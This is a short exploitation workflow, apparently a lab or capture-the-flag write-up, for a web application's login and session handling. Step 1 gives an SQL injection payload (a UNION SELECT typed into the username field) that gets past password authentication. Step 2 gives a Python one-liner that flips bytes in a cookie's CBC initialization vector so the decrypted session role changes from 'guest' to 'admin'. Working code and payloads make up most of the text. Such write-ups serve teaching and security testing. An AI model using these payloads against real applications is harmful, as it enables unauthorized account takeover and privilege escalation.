# PPayloads and Exploitation Workflow

This document records the commands and logic used to test database login bypasses and modify token states in the local lab environment.

---

## Step 1: Bypassing Database Authentication (SQL Injection)

To see how the application creates session cookies for users, enter the following statement into the username field on the login page:

```text
admin' UNION SELECT 'admin', '' -- -
```

### Concept:
* **What it does:** This payload uses a UNION SELECT statement to exploit unsecure input handling. 
* **The Goal:** IIt tricks the database into returning a fake record for the "admin" user. This skips the password check and forces the app to give you an initial session cookie.

---

## Step 2: Modifying Token States

After the app gives you a cookie, run the following command in your terminal. Replace `'Here goes the token cookie'` with the actual cookie string you received from your browser.

```bash
python3 -c "
import base64
from urllib.parse import quote, unquote


original_token_b64 = 'Here goes the token cookie'


clean_b64 = unquote(original_token_b64)


iv = bytearray(base64.b64decode(clean_b64))

old = b'guest'
new = b'admin'

for i in range(len(old)):
    iv[i] ^= old[i] ^ new[i]

admin_token = quote(base64.b64encode(iv).decode())
print('Your Admin Token:', admin_token)
"
```

### Concept:
* **What it does:** This script alters the raw bytes of the Initialization Vector (IV).
* **The Goal:** Because Cipher Block Chaining (CBC) mode decrypts the first block by XORing it with the IV, a direct modification of the IV forces a bit-for-bit change in the final decrypted text. This alters the session context from `guest` to `admin` without altering the key.

